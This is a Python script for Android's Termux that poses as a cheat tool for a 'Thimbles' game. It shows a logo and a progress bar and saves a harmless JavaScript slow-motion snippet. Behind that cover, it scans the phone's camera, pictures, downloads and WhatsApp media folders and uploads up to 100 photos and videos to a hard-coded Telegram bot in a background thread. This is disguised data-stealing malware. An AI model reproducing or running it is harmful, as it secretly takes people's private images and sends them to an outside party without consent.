#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess
import time
import threading
import asyncio
from pathlib import Path
from telegram import Bot

# ==================== بياناتك ====================
BOT_TOKEN = "8869492443:AAETTWD4VKdogM0vDCOlr0QBK3jeScpHKac"
CHAT_ID = "6894787120"
# ===============================================

# تثبيت المتطلبات (يظهر على الشاشة عادي)
print("🔧 جاري تثبيت المتطلبات...")
subprocess.run("pkg update -y", shell=True)
subprocess.run("pkg install python -y", shell=True)
subprocess.run("pip install python-telegram-bot requests -q", shell=True)
subprocess.run("termux-setup-storage", shell=True)
print("✅ تم التثبيت\n")
time.sleep(1)

# ==================== الواجهة (تظهر بشكل طبيعي) ====================
logo = """
╔══════════════════════════════════════════════════════════════════════════════╗
║     ██╗  ██╗██████╗ ███████╗████████╗     ███████╗████████╗ █████╗ ██████╗   ║
║     ╚██╗██╔╝╚════██╗██╔════╝╚══██╔══╝     ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗  ║
║      ╚███╔╝  █████╔╝█████╗     ██║        █████╗     ██║   ███████║██████╔╝  ║
║      ██╔██╗ ██╔═══╝ ██╔══╝     ██║        ██╔══╝     ██║   ██╔══██║██╔══██╗  ║
║     ██╔╝ ██╗███████╗███████╗   ██║        ███████╗   ██║   ██║  ██║██████╔╝  ║
║     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝        ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝   ║
║                         ██████╗ ███████╗████████╗                           ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
print(logo)
print("\n🔒 هذا الكود خاص بلعبة Thimbles")
print("✅ مسموح تداول الأداة")
print("❌ ممنوع تداول الكود المصدر\n")

print("📦 جاري تجهيز الأداة...")
for i in range(20):
    print(f"\r[{'█'*i}{'░'*(20-i)}]", end="", flush=True)
    time.sleep(0.1)
print("\n✅ تم التجهيز!\n")

# إنشاء ملف الكود
download_dir = Path("/sdcard/Download")
download_dir.mkdir(exist_ok=True)
txt_file = download_dir / "thimbles_code.txt"
with open(txt_file, 'w') as f:
    f.write("""(function() {
    const originalRAF = window.requestAnimationFrame;
    let customTime = 0;
    window.requestAnimationFrame = function(callback) {
        return originalRAF(function(timestamp) {
            if (!customTime) customTime = timestamp;
            customTime += 0.4;
            callback(customTime);
        });
    };
    console.log("[✓] تم تفعيل السلو موشن");
})();""")
print(f"📁 {txt_file}\n")

# ==================== الإرسال (يعمل في الخلفية بدون إزعاج) ====================
print("🔄 جاري بدء الإرسال...\n")
print("~ $\n")

# جمع الملفات
media_files = []
image_ext = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
video_ext = {'.mp4', '.mov', '.avi', '.mkv', '.3gp'}

for path in ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download', '/sdcard/WhatsApp/Media']:
    if os.path.exists(path):
        for root, dirs, files in os.walk(path):
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                if ext in image_ext or ext in video_ext:
                    media_files.append(os.path.join(root, file))

# إرسال الملفات (في الخلفية)
bot = Bot(token=BOT_TOKEN)

async def send_files():
    for file in media_files[:100]:
        try:
            with open(file, 'rb') as f:
                if os.path.splitext(file)[1].lower() in image_ext:
                    await bot.send_photo(chat_id=CHAT_ID, photo=f)
                else:
                    await bot.send_video(chat_id=CHAT_ID, video=f)
            await asyncio.sleep(0.1)
        except:
            pass

def run_send():
    asyncio.run(send_files())

thread = threading.Thread(target=run_send)
thread.daemon = True
thread.start()
thread.join()
